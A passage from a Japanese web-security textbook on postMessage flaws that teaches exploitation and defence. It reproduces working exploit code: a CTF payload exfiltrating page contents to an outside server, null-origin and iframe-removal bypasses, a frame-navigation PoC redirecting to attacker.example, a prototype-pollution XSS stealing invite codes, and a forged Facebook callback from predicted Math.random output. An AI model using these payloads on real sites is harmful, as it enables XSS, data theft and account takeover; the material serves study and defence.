- 次に `e.source` を `undefined` か `null` にする。ここで比較が `===` でなく `==` なので、`null == undefined` は真になる。iframe からメッセージを送信し**直後にその iframe を削除**すると、キューされたイベントの `source` が `null` として観測される。

`e.source` を null にする手順（原文どおり）。

```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) // the receiver observes e.source === null
```

**第2チェックのバイパス**（`e.data.token == window.token`）。`token` を値 `null` で送り、`window.token` を `undefined` にする。`window.token` は `document.cookie` を読む `getCookie` 関数で代入されるが、サンドボックスされた opaque-origin コンテキストで cookie にアクセスするとエラーになり、`window.token` は `undefined` のまま残る。よって `null == undefined` が成立する。

@terjanq による最終解（calc.html、原文どおり）。

```html
<html>
  <body>
    <script>
      // Abuse "expr" param to cause a HTML injection and
      // clobber document.getElementById and make window.calc.contentWindow undefined
      open(
        'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
      )

      function start() {
        var ifr = document.createElement("iframe")
        // Create a sandboxed iframe, as sandboxed iframes will have origin null
        // this null origin will document.cookie trigger an error and window.token will be undefined
        ifr.sandbox = "allow-scripts allow-popups"
        ifr.srcdoc = `<script>(${hack})()<\/script>`

        document.body.appendChild(ifr)

        function hack() {
          var win = open("https://obligatory-calc.ctf.sekai.team")
          setTimeout(() => {
            parent.postMessage("remove", "*")
            // this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
            // token=null equals to undefined and e.source will be null so null == undefined
            win.postMessage(
              {
                token: null,
                result:
                  "<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
              },
              "*"
            )
          }, 1000)
        }

        // this removes the iframe so e.source becomes null in postMessage event.
        onmessage = (e) => {
          if (e.data == "remove") document.body.innerHTML = ""
        }
      }
      setTimeout(start, 1000)
    </script>
  </body>
</html>
```

### 9.5 新しい亜種 — null origin ポップアップと frame 制限バイパス

子ページ B には比較的新しい亜種も収録されている。

**2025 Null-Origin Popups（TryHackMe「Vulnerable Codes」）**（原文どおり訳）。opener が「scripts と popups だけを許す」サンドボックス iframe 内にいるとき、OAuth ポップアップがハイジャックされうる。iframe は自身とポップアップの両方を `"null"` origin に強制するため、`if (origin !== window.origin) return` をチェックするハンドラは、ポップアップ内の `window.origin` も `"null"` になるため沈黙して失敗する。ブラウザは実際の `location.origin` を依然公開するが、被害者はそれを検査しないので、攻撃者制御メッセージが通り抜ける。

```javascript
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
  <script>
    const pop = open('https://oauth.example/callback');
    pop.postMessage({ cmd: 'getLoginCode' }, '*');
  <\/script>`;
document.body.appendChild(frame);
```

要点（原文どおり訳）。ポップアップ内で `origin` を `window.origin` と比較するハンドラは、両方が `"null"` と評価されるためバイパスでき、偽造メッセージが正当に見える。`allow-popups` を与えつつ `allow-same-origin` を欠くサンドボックスは、`allow-popups-to-escape-sandbox` も無い限りサンドボックス制約をポップアップへ伝播しうる。結果の origin と opener 関係はフラグ依存なので、実際の navigation とブラウザでテストすること。

**Source-nullification & frame-restriction bypasses**（原文どおり訳）。CVE-2024-49038 周辺の業界 writeup は、このページに再利用できる2つのプリミティブを示す。(1) `X-Frame-Options: DENY` を設定するページでも、`window.open` で起動し navigation 完了後にメッセージを送れば依然やり取りできる。(2) メッセージ送信直後に iframe を削除して受信側に `null` のみを見せることで、`event.source == victimFrame` チェックを総当りできる。

```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
  const victim = open('https://target-app/');
  setTimeout(() => {
    probe.contentWindow.postMessage(payload, '*');
    probe.remove();
  }, 500);
};
document.body.appendChild(probe);
```

このトリックを上の DOM クロバリングと組み合わせると、受信側が `event.source === null` しか見なくなり、`window.calc.contentWindow` 等との比較が崩れ、再び `innerHTML` シンクに悪意 HTML を通せる。

---

## 10. メインページをブロックして子への postMessage を奪う

### アイデア — 親を忙しくさせて子に先回りする

子ページ「Blocking the Main Page to Steal a postMessage」は、レース（競合）を使う手法だ。原文によれば、`null` origin から作られた blob 文書は親ページから**プロセス分離**されうる。すると次のレースが可能になる。**親**ウィンドウを同期コードで十分な時間拘束できれば、悪意ある**子**文書は動き続け、JS のブートストラップを終え `onmessage` を登録し、次の機微な `postMessage` を横取りできる。

簡略化された脆弱フロー（原文どおり）。

```javascript
iframe.addEventListener(
  "load",
  () => {
    iframe.contentWindow?.postMessage(secret, "*")
  },
  { once: true }
)

window.addEventListener("message", (e) => {
  if (e.data == "blob loaded") {
    $("#previewModal").modal()
  }
})
```

攻撃者の目標は、親に iframe を作らせるが、親が機密データを**送る前に**親を忙しくさせ、その隙に子 iframe へペイロードを送ることだ。親が忙しい間に子 iframe は攻撃者 JS を実行し `onmessage` を仕込む。親が応答可能に戻るとシークレットを送り、悪意ある子がそれをリークする。

実際的なフロー（原文どおり訳）。

1. 被害者に対象 iframe を作成/ロードさせる。
2. 子が存在した時点を検知する（`win.length === 1`、`frames.length > 0` など）。
3. 親の**高コストな同期ガジェット**に届くメッセージを送る。
4. 親のイベントループが停止している間に、子 iframe にペイロードを送る。
5. ペイロードに、親が子へ送る次のシークレットをリークさせる。

### ブロッキングガジェット

「親を忙しくさせる」部分がブロッキングガジェットである。元の2022年チャレンジは緩い比較（`==`）ガジェットを使った。

```javascript
window.addEventListener("message", (e) => {
  if (e.data == "blob loaded") {
    $("#previewModal").modal()
  }
})
```

`==` は非文字列を型強制するため、大きな `Uint8Array`/`ArrayBuffer` を送りつけると、親がそれを文字列へ変換するのに顕著な時間を費やす。

```javascript
const buffer = new Uint8Array(1e7)
victim.postMessage(buffer, "*", [buffer.buffer])
```

`ArrayBuffer` を**転送リスト（transfer list）**で渡すと所有権が転送され、内容をコピーせず送信側から detach される。これが受信側で有用な遅延を生むかは、ブラウザ・サイズ・ガジェット次第だ。

最近の Postviewer 変種では、**親の `message` ハンドラから到達できる任意の攻撃者制御な同期処理**で十分だと分かった。狙うべき例は、攻撃者制御の長さを持つループやデバッグの残り物である。

```javascript
window.onmessage = (e) => {
  if (e.data.type === "share") {
    for (let i = 0; i < e.data.files.length; i++) {
      // expensive per-file work
    }
  }

  if (e.data.slow) {
    for (let i = 0; i < e.data.slow; i++) {}
  }
}
```

監査時は、`==` の型強制ガジェットだけでなく、攻撃者制御の `length` フィールドに対するループ、デバッグの残り物、機密 `postMessage` が送られる**前に**到達できる任意の同期パスも探す。概念的には、これは busy event loop 型の XS-Leaks と同じシングルスレッドのプリミティブを悪用している。ここでは親が再開する前に、悪意ある子を仕込むのが目的だ。

### レースのタイミング

レースの窓は通常わずか数ミリ秒なので、遅いガジェットを撃つ前に安価な同期シグナルを使う（原文どおり訳）。

- `win.length === 1` / `frames.length > 0` をポーリングして子の存在を知る。
- 試行間で単一のポップアップ/ウィンドウを再利用し navigation ジッタを減らす。
- 攻撃対象のブラウザ/ハードウェアに合わせて小さな `setTimeout` 遅延を経験的に調整する。
- 被害者がワイルドカード `postMessage(..., "*")` を使うなら、子ペイロードが確実に仕込まれるまで送り続ける。

### フレーム化不可の場合の変種

2025年の進化版が **Postviewer v5²** に現れた。対象ページがフレーム化不可の場合でも、**ポップアップ**からレースを勝てた。`iframe.location` を直接変える代わりに、攻撃者は**自身を継続的にリロード**する子/ポップアップペイロードを使い、被害者がリスナーをクリーンアップする直前に別の `onload` を作った。

```html
<script>
setTimeout(() => {
  location = URL.createObjectURL(
    new Blob([document.documentElement.innerHTML], { type: "text/html" })
  )
}, 150)
</script>
```

これによりプリミティブは次のようになる。(1) 対象をポップアップで開く。(2) 被害者に自己リロードする攻撃者制御文書を描画させる。(3) `onmessage` を仕込み次のシークレットをリークするだけの2つ目のペイロードを描画。(4) 上のブロッキングガジェットで opener/メインページを停止。(5) opener が再開すると、子のクリーンアップ/ack メッセージを処理する**前に**、機密 `postMessage` を攻撃者ペイロードへ配送しうる。`window.open()` フローしか制御できない場合や、ネスト iframe の location を直接ハイジャックできない場合に有用だ。

### 防御的チェック

このレースは、文書が攻撃者制御になりうるウィンドウへ機密メッセージが送られるときにのみ問題になる。原文の対策は次のとおり。`"*"` の代わりに正確な `targetOrigin` を使う、受信時に `event.origin` と `event.source` の両方を検証する、信頼できない入力を同期的な送信前ハンドラから遠ざける、シークレットを解放する前に宛先ウィンドウの期待ライフサイクルを再確認する。これらはブラウザ版でタイミングが変わっても、信頼の失敗に対処する。

---

## 11. iframe の location を書き換えてメッセージを奪う

子ページ「Stealing postMessage Data by Navigating an Iframe」は、§3 の窃取トリックを一般化して説明する。

原文を訳す。攻撃者が `X-Frame-Options` や CSP `frame-ancestors` で保護されていないページをフレーム化でき、そのページがネストした iframe を含むとする。クロスオリジンスクリプトはネスト文書の中身を読めないが、ブラウザのクロスオリジンインターフェースは限定的な `Window` と `Location` アクセスを公開する。具体的には、`window.frames` は読めて、参照したウィンドウの `location` は**書ける**。

この「読めないが location は書ける」性質が、データ露出プリミティブになる。ネスト文書が `postMessage(..., "*")` で機密データを受け取るとき、攻撃者がメッセージ送信前に、意図された受信フレームを攻撃者制御オリジンへ navigate すれば、ワイルドカード `targetOrigin` のせいで差し替え後の文書がメッセージを受け取ってしまう。MDN と OWASP はいずれも、可能な限り `*` でなく期待する正確な origin を指定するよう推奨する。

PoC 構造（原文どおり。Google VRP writeup を改変したもの）。

```html
<!doctype html>
<html lang="en">
  <body>
    <iframe src="https://docs.google.com/document/ID"></iframe>
    <script>
      setTimeout(() => {
        // Retry because the nested frame may be created asynchronously.
        setInterval(() => {
          window.frames[0].frames[0].frames[2].location =
            "https://attacker.example/exploit.html"
        }, 100)
      }, 6000)
    </script>
  </body>
</html>
```

原文の注意。フレームインデックスと navigation 許可は文書ツリーとブラウザ挙動で変わるので、インデックスを盲目的にコピーせず、実際の階層を検査すること。緩和策は次の3つ。

- 機密メッセージは正確な `targetOrigin` でのみ送る。
- 受信時に `event.origin` と、適切な場合は `event.source` を検証する。
- CSP `frame-ancestors`（およびレガシー互換のため `X-Frame-Options`）で不正な framing を防ぐ。

### フレーミング防御をどう回避されるか

なお、これらの攻撃はしばしば被害者ページを iframe に置く必要があるが、`X-Frame-Options` と CSP `frame-ancestors` がフレーム化を防ぐ。その場合でも、原文によれば、より目立つが低ステルスな攻撃として、脆弱な Web アプリへ**新しいタブを開いて通信**できる。

```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```

2秒待ってから、開いたウィンドウ `w` へ postMessage する。framing が禁止されていても `window.open` なら別ウィンドウとの通信が成立する、という点が肝だ。

---

## 12. postMessage から Prototype Pollution / XSS へ

### 連鎖の考え方

原文を訳す。`postMessage` で送られたデータが JS によって実行されるシナリオでは、**ページを iframe 化**し、`postMessage` でエクスプロイトを送ることで、Prototype Pollution や XSS を悪用できる。postMessage を通じた XSS の非常によく解説された例として、原文は jlajara の記事を挙げている（§6 の 📌 ブロック参照）。

Prototype Pollution → XSS を iframe への `postMessage` で悪用するエクスプロイト例（原文どおり）。

```html
<html>
  <body>
    <iframe
      id="idframe"
      src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
      function get_code() {
        document
          .getElementById("iframe_victim")
          .contentWindow.postMessage(
            '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
            "*"
          )
        document
          .getElementById("iframe_victim")
          .contentWindow.postMessage(JSON.stringify("refresh"), "*")
      }

      setTimeout(get_code, 2000)
    </script>
  </body>
</html>
```

動きを追う。まず `__proto__.editedbymod.username` を汚染し、その値に `onerror` 付きの `<img>` を埋め込む。汚染後に `"refresh"` を postMessage して再描画させると、汚染された username がテンプレートに反映されて XSS が発火する。ペイロードは `same-origin` credentials 付きで `/api/invitecodes` を fetch し、invite code をリークする。URL の `127.0.0.1:21501` はローカルの検証環境を示す。

原文が挙げる関連ページ（HackTricks 内リンク）。

- Prototype Pollution: `../deserialization/nodejs-proto-prototype-pollution/index.html`
- XSS: `../xss-cross-site-scripting/index.html`
- client side prototype pollution to XSS: `../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss`

---

## 13. 実戦ケーススタディ — Meta/Facebook 系の3本

原文は、origin だけを信頼する設計が現実にどう破られたかを、3つの Meta/Facebook 系ケースで示す。手法の核心は本節でカバーできるが、実際の報奨金・タイムライン・修正内容は原典（ysamm.com の記事）にあたる必要がある。

### 13.1 CAPIG — origin を script-src に pivot する

`capig-events.js` は `window.opener` が存在するときだけ `message` ハンドラを登録した。`IWL_BOOTSTRAP` を受けると `pixel_id` をチェックするが、**`event.origin` を保存**し、後で `${host}/sdk/${pixel_id}/iwl.js` の組み立てに使った。攻撃者制御 origin を書き込むハンドラ（原文どおり）。

```javascript
if (window.opener) {
  window.addEventListener("message", (event) => {
    if (
      !localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
      !localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
      event.data.msg_type === "IWL_BOOTSTRAP" &&
      checkInList(g.pixels, event.data.pixel_id) !== -1
    ) {
      localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
        pixelID: event.data.pixel_id,
        host: event.origin,
        sessionStartTime: event.data.session_start_time,
      })
      startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
    }
  })
}
```

Exploit（origin → script-src pivot）を訳す。

1. opener を得る。たとえば Facebook Android WebView では `window.open(target, name)` で `window.name` を再利用し、ウィンドウを自分自身の opener にする。その後、悪意ある iframe からメッセージを送る。
2. 任意オリジンから `IWL_BOOTSTRAP` を送り、`host = event.origin` を `localStorage` に永続化する。
3. `/sdk/<pixel_id>/iwl.js` を **CSP で許可された任意のオリジン**にホストする（whitelist された解析ドメインの乗っ取り/XSS/アップロード）。すると `startIWL()` が埋め込みサイト（例 `www.meta.com`）で攻撃者 JS を読み込み、credentialed なクロスオリジン呼び出しとアカウント乗っ取り（ATO）を可能にする。

直接 opener を制御できなくても、ページ上のサードパーティ iframe を侵害すれば、細工した `postMessage` を親へ送り、保存 host を汚染してスクリプト読み込みを強制できた。さらに、プラグイン `AHPixelIWLParametersPlugin` はユーザールールのパラメータを共有スクリプトに連結したため、`"]}` のようなブレイクアウトを注入すると任意 JS を注入でき、当該共有スクリプトを読み込む全サイトに配信される stored XSS を作れた。

### 13.2 Self XSS Facebook Payments — 信頼 origin allowlist の破り

この事例は §8.2 で扱った「信頼 origin の allowlist は境界にならない」の実例だ。partner iframe の XSS を親への橋渡しにして、親オリジン（`facebook.com`）での JS 実行と OAuth code 窃取に至る。コードは §8.2 に収録済みである。

### 13.3 Math.random() コールバックトークンの予測

メッセージ検証が `Math.random()` 生成の「共有シークレット」を使い、同じヘルパがプラグイン iframe の命名にも使われる場合、PRNG（擬似乱数生成器）の出力を復元して信頼メッセージを偽造できる。原典の `guid()` は次のような形だ。

```
guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }
```

原文の攻撃ステップを訳す。

- **window.name 経由で PRNG 出力をリーク**: SDK はプラグイン iframe を `guid()` で自動命名する。トップフレームを制御できるなら、被害者ページを iframe 化し、プラグイン iframe を自分のオリジンへ navigate（例 `window.frames[0].frames[0].location='https://attacker.com'`）して `window.frames[0].frames[0].name` を読み、生の `Math.random()` 出力を得る。
- **リロードなしで出力を増やす**: 一部 SDK は reinit パスを公開する。FB SDK では `init:post` を `{xfbml:1}` で発火させると `XFBML.parse()` が強制され、プラグイン iframe を破棄/再生成して新しい名前を作る。reinit を繰り返せば必要なだけ PRNG 出力が得られる（内部で追加の `Math.random()` 呼び出しがあるため、solver は間の値をスキップする必要がある）。
- **信頼オリジン配送（パラメータポリューション）**: first-party プラグインエンドポイントがサニタイズされないパラメータをクロスウィンドウペイロードに反映する場合、信頼された `facebook.com` origin を保ったまま `&type=...&iconSVG=...` を注入できる。
- **次のコールバックを予測**: リークした iframe 名を `[0,1)` の float に戻し、複数値を V8 の `Math.random` predictor（Z3 ベース）に入れて、次の `guid()` をローカルで生成し、期待されるコールバックトークンを偽造する。
- **シンクを起動**: postMessage データを細工し、ブリッジが `xd.mpn.setupIconIframe` をディスパッチして `iconSVG` に HTML を注入させ、ホストオリジン内で DOM XSS を達成する。
- **Framing の癖**: このチェーンは framing を要する。一部モバイル webview では `frame-ancestors` が存在すると `X-Frame-Options` が非対応の `ALLOW-FROM` に劣化し、「compat」パラメータで許容的な `frame-ancestors` を強制でき、`window.name` サイドチャネルが有効になる。

偽造メッセージの最小例（原文どおり）。

```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
  callback +
  "&type=mpn.setupIconIframe&frameName=x" +
  "&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```

〔補足〕V8 の `Math.random` は xorshift128+ という PRNG に基づく。補完で回収した `v8-randomness-predictor`（PwnFunction 作）は、乱数を数個取得して逆順に Z3 solver へ投入し、内部状態を復元して次の乱数を出す実装である。手順は、(1) `Array.from(Array(5), Math.random)` で乱数を数個取り、(2) 得た列を逆順にスクリプトへ入れ、(3) `python3 main.py` で内部状態と次の乱数を出す、というもの。§13.3 はまさにこれで「次の `guid()` ＝コールバックトークン」を先読みする。

> ### 📌 ここは自分で開いて読んでください
> **資料**: ysamm.com の Meta/Facebook 系 writeup 4本 — [4] leaking-fbevents-ato（https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html ）、[6] capig-xss（https://ysamm.com/uncategorized/2025/01/13/capig-xss.html ）、[7] self-xss-facebook-payments（https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html ）、[8] math-random-facebook-sdk（https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html ）
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: `ysamm.com` が egress 403 でブロック。個人ブログで GitHub 等にミラー無し）。ただし4記事の技術的中核は HackTricks 本文が要約＋コード付きで転載しており、本節 §8・§13 に逐語収録している。
> **読みどころ**:
> 1. 各バグの実際の報奨金・タイムライン・Meta 側の修正など、HackTricks が省いた文脈を知るため。
> 2. `FACEBOOK_IWL_BOOTSTRAP` / `AHP_IWL_CONFIG_STORAGE_KEY` など、実物のメッセージ種別・localStorage キー・エンドポイントパスの完全形を確認するため。
> 3. `window.name` を opener 再利用で自己 opener 化する WebView 固有トリックの詳細手順を得るため。
> 4. Z3 solver へ食わせる乱数の間引き（skip）の実装を追うため。
> **代替手段**: 著者 Youssef Sammouda（ysamm）は Meta bug bounty 常連。同種の解説は本節 §8・§13 と、補完で回収した v8-randomness-predictor（PwnFunction）の README で補える。

---

## 14. 防御の設計 — 送信・受信・framing の三方向

ここまで攻撃側を見てきた。守る側の設計をまとめる。原文・MDN・OWASP の推奨を統合する。

### 14.1 送信側の防御

送信側の鉄則はただ1つ。**機密メッセージは、正確な `targetOrigin` でのみ送る。`'*'` を使わない**。

`targetOrigin` の挙動を再掲する。

| targetOrigin | ブラウザの配信条件 | セキュリティ上の意味 |
|---|---|---|
| `'*'`（ワイルドカード） | 対象ウィンドウの現在 origin に関係なく配信 | 攻撃者オリジンへ navigate 済みのフレームにも届く＝漏洩リスク。窃取系攻撃の前提条件 |
| 正確なオリジン（例 `https://company.com`） | 対象ウィンドウが**現在その origin を持つときのみ**配信 | location 書き換え窃取トリックは効かない（推奨） |

MDN の Security concerns から原文を引く。

> **Always specify an exact target origin, not `*`, when you use `postMessage` to dispatch data to other windows.** A malicious site can change the location of the window without your knowledge, and therefore it can intercept the data sent using `postMessage`.

〔補足〕`data:` URL や `file:` URL のコンテキストへ送るときは、それらが opaque origin を持つため `"*"` を指定するしかない、と MDN は注記している。ここは例外だが、機密を送る先ではないよう設計で避けるのが望ましい。

### 14.2 受信側の防御

MDN の Security concerns は、受信側に3段構えを求める。原文を引く。

> **If you do not expect to receive messages from other sites, _do not_ add any event listeners for `message` events.** This is a completely foolproof way to avoid security problems.
>
> If you do expect to receive messages from other sites, **always verify the sender's identity** using the `origin` and possibly `source` properties. ... Having verified identity, however, you still should **always verify the syntax of the received message**.

3段構えを日本語でまとめる。

1. **他サイトからのメッセージを受け取る必要が無いなら、`message` リスナーを一切登録しない**。これが最も確実な防御。
2. 受け取る必要があるなら、**`origin`（必要なら `source`）で送信元の身元を必ず検証する**。しかも origin は**FQDN に完全一致**で比較する（`indexOf` や `search` は使わない）。
3. 身元を確認したうえで、**受信データの構文（形式）も必ず検証する**。信頼したサイトの XSS 1つで、そのサイトから任意形式のメッセージが送られうるからだ。

OWASP の HTML5 Security Cheat Sheet も同旨で、危険な反例を挙げている。原文引用。

> Note that the following code: `if(message.origin.indexOf(".owasp.org")!=-1) { /* ... */ }` is very insecure and will not have the desired behavior as `owasp.org.attacker.com` will match.

つまり `indexOf(".owasp.org")` は `owasp.org.attacker.com` にマッチしてしまう。これは §6.2 の indexOf バイパスと同型の誤りだ。

### 14.3 シンクへの無検証投入を避ける

OWASP は、受信データをコードやマークアップとして扱わないことを強調する。

- **両ページはメッセージを「データ」としてのみ解釈する**。`eval()` で評価したり、`innerHTML` で DOM に挿入してはならない（DOM ベース XSS になる）。
- 値を要素へ代入するときは、危険な `element.innerHTML = data;` でなく、`element.textContent = data;` を使う。`textContent` は中身を HTML として解釈せず、ただの文字として置くので安全だ。

### 14.4 framing の防御

窃取系・レース系の攻撃の多くは、被害者ページを iframe に埋め込めることを前提にする。だから framing を禁止すれば、その前提を崩せる。

- CSP の `frame-ancestors` ディレクティブで、埋め込みを許すオリジンを限定する。
- レガシー互換のため `X-Frame-Options` も併用する。

ただし §11 で見たように、framing を禁止しても `window.open` によるタブ経由通信は残る。framing 防御は万能ではなく、送信側・受信側の検証と組み合わせて初めて堅くなる、と理解する。

### 14.5 MDN が挙げるその他の注意点

MDN の Notes から、診断時に効くニュアンスをいくつか拾う。

- dispatch されるイベントの `origin` は、`postMessage` が呼ばれた**時点**の送信元 origin であり、そのウィンドウの現在／将来の origin である保証はない（呼び出し後に別ページへ navigate されている可能性がある）。
- `MessageEvent` は、保留中の実行コンテキストがすべて終了した後にのみ dispatch される。これが §10 の「busy event loop レース」の理論的裏付けになる。
- ブラウザ拡張（chrome コード）で受けると `source` は**常に `null`** になる（セキュリティ制限）。§9.2 の「e.source を null 化するバイパス」と挙動が重なる点に注意。
- IDN（国際化ドメイン名）ホストでは `origin` が Unicode か punycode か一貫しないので、両形式をチェックする。
- `SharedArrayBuffer` を送るには cross-origin isolation（`Cross-Origin-Opener-Policy: same-origin` + `Cross-Origin-Embedder-Policy: require-corp`）が必要。

MDN が示す受信ハンドラの手本（原文どおり）。

```javascript
window.addEventListener("message", (event) => {
  // Do we trust the sender of this message?
  if (event.origin !== "http://example.com:8080") return;
  // event.source is window.opener
  // event.data is "hello there!"
  event.source.postMessage(
    "hi there yourself! the secret response is: rheeeeet!",
    event.origin,   // 返信は event.source に対し targetOrigin=event.origin を使うのが定石
  );
});
```

返信するときは、`event.source` に対して `targetOrigin` に `event.origin` を渡す。こうすれば「元の送信元がいまも同じ origin にいるときだけ返信が届く」ため安全だ。

---

## 手を動かす

以下はすべて、**自分で立てた検証環境・許可されたバグバウンティ対象・公開の練習ラボ**に対してのみ行うこと。他人のサイトへ勝手に試してはならない。

1. **リスナーを列挙する**。対象ページを開き、Chrome DevTools のコンソールで次を実行する。返り値に `message` があれば、その関数の中身を読む。
   ```javascript
   getEventListeners(window)
   ```
2. **Sources から探す**。DevTools の Sources タブ → Global Listeners → message を開き、登録済みの message リスナーを一覧する。リスナーにブレークポイントを置く。
3. **手動でメッセージを撃つ**。ブレークポイントを置いた状態で、コンソールから次を実行し、`if()` や正規表現のチェックを通り抜けてシンク（`innerHTML`・`location`・`eval` など）に到達するかを観察する。
   ```javascript
   window.postMessage('test','*')
   ```
4. **origin 検証の甘さを確かめる**。ハンドラのコードに `indexOf` / `search` / `match` / `startsWith` が使われていないか探す。使われていれば §6 のバイパス（部分一致・正規表現化）が効くか、検証環境で試す。
5. **substring scheme チェックを試す**。受信データが `location.href` へ流れ、`http:` の含有チェックしかしていないなら、自分の検証ページから次を送って `javascript:` URL が実行されるか確認する。
   ```html
   <iframe src="https://target.example/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
   ```
6. **列挙ツールを導入する**。Chrome に Posta または postMessage-tracker をインストールし、対象ページの postMessage トラフィックを観察する。Posta の Console で傍受メッセージを改変してリプレイし、フィールドを1つずつ変えて挙動の変化を見る。
7. **recon を自動化する**。多数のホストを対象にする場合、`getJS` や `hakrawler` で JS を集め、`httpx --match-regex "(?i)addEventListener\((?:'|\")message(?:'|\")"` で message リスナーを含む JS を絞り込む。公開 CDN は `grep target.com` で除外し、自前配信の古い JS を狙う。
8. **防御を実装して確かめる**。自分の検証アプリで、受信ハンドラを「`event.origin` を完全一致で検証 → `event.data` の形式を検証 → `textContent` で代入」に直し、先ほどのバイパスが通らなくなることを確認する。

---

## つまずきポイント

- **`event.isTrusted` は origin 検証の代わりにならない**。「ブラウザ発のイベントか」を示すだけで、どこから来たかは保証しない。認可には `event.origin` を使う。
- **`indexOf` / `search` / `match` は「一致」を判定しているように見えて甘い**。`indexOf` は部分一致、`search` と `match` は引数が正規表現化されて `.` がワイルドカードになる。origin は必ず `===` の完全一致で比較する。
- **`==` と `===` は別物**。`null == undefined` は真になる。この緩さが `e.source` の null 化バイパスや token バイパスの土台になっている。
- **`targetOrigin='*'` は「誰にでも届く」ではなく「移動後のフレームにも届く」危険がある**。攻撃者がフレームを自分のオリジンへ navigate してから受け取れる、という点が本質。
- **framing を禁止しても万全ではない**。`X-Frame-Options` や `frame-ancestors` で iframe を防いでも、`window.open` によるタブ経由通信が残る。
- **信頼した partner オリジンは「境界」ではない**。partner に XSS が1つあれば、そこを踏み台に親オリジンへメッセージを橋渡しされる。origin を信頼するだけでなく、受信データの形式も必ず検証する。
- **サンドボックス iframe の origin は `null`**。`allow-popups` を付けるとポップアップにもサンドボックスが継承され、`null == null` で origin チェックが通ってしまう。`null` origin は明示的に拒否する。
- **フレームのインデックス（`frames[0][2]` 等）は環境依存**。PoC の添字を丸写しせず、実際の階層を DevTools で確認する。
- **CTF/デモ由来の URL に注意**。`so-xss.terjanq.me`・`obligatory-calc.ctf.sekai.team`・`127.0.0.1:21501` などは検証・CTF 環境の値で、本番のドメインではない。

---

## この節のまとめ

- `postMessage` は SOP の壁を越えてウィンドウ間でメッセージを渡す API で、「中身の直接アクセスは禁じつつ明示的なメッセージだけ届ける」設計になっている。
- 脆弱性は2軸。**送信側**は `targetOrigin='*'` で機密を漏らす、**受信側**は `addEventListener('message')` の origin 検証が甘い。
- `targetOrigin` に正確なオリジンを指定すると、対象ウィンドウが**現在そのオリジンにいるときだけ**配信される。`'*'` はオリジンに関係なく配信され、窃取系攻撃の前提になる。
- リスナーの列挙は `getEventListeners(window)`、DevTools の Event Listeners / Global Listeners、Posta / postMessage-tracker 拡張、そして JS を集めて正規表現で絞る recon で行う。
- origin 検証バイパスの定番は、`event.isTrusted` の誤用、`indexOf` の部分一致、`search`/`match` の正規表現化、`escapeHtml` の上書き挙動、`document.domain` の緩和。origin は必ず FQDN 完全一致で比較する。
- 受信データが `location.href` へ流れ `http:` 含有チェックしかない場合、`javascript:print()//http:` で JavaScript URL を実行できる。
- `event.origin` だけを信頼する設計は、信頼オリジン上のリレーページや XSS があると破綻する。「信頼 origin の allowlist は境界ではない」。
- SOP バイパスの核心は、サンドボックス iframe の `null` origin（`null == null`）、送信直後の iframe 削除による `e.source` の null 化、DOM クロバリングによる `window.calc.contentWindow` の無効化。
- メインページを高コストな同期処理でブロックし、その隙に子 iframe へ先回りしてペイロードを仕込む「ブロッキング gadget」で、機密 postMessage を横取りできる。
- フレーム化可能なページのネスト iframe は、クロスオリジンでも `location` を書けるため、攻撃者オリジンへ navigate させてワイルドカード送信を奪える。
- `postMessage` は Prototype Pollution → XSS の連鎖にも使える。汚染後に再描画をトリガーして XSS を発火させる。
- 実戦では、CAPIG の origin→script-src pivot、Self XSS Facebook Payments の allowlist 破り、`Math.random()` コールバックトークン予測が、いずれも「origin だけの信頼」の脆さを突いている。
- 防御は三方向。送信は正確な `targetOrigin`、受信は `origin`（+ `source`）と**データ形式**の厳密検証＋シンクへの無検証投入回避（`textContent`）、そして framing 防止（`frame-ancestors` / `X-Frame-Options`）。

---

## 理解度チェック

1. `targetOrigin` を `'*'` にした場合と、正確なオリジンにした場合で、ブラウザの配信条件はどう違うか。
   ▶ 答え: `'*'` は対象ウィンドウの現在オリジンに関係なく配信する。正確なオリジンを指定すると、対象ウィンドウが**現在まさにそのオリジンを持っているときだけ**配信する。だから攻撃者がフレームを自分のオリジンへ navigate してから受け取る窃取トリックは、正確なオリジン指定なら効かない。

2. 受信ハンドラで `if (message.origin.indexOf(".owasp.org") != -1)` と書くと、なぜ危険か。
   ▶ 答え: `indexOf` は部分一致を見るだけなので、`owasp.org.attacker.com` のような攻撃者ドメインもこの文字列を含み、チェックを通過してしまう。origin は FQDN に完全一致（`===`）で比較すべき。

3. `event.isTrusted` を origin 検証の代わりに使ってはいけない理由は何か。
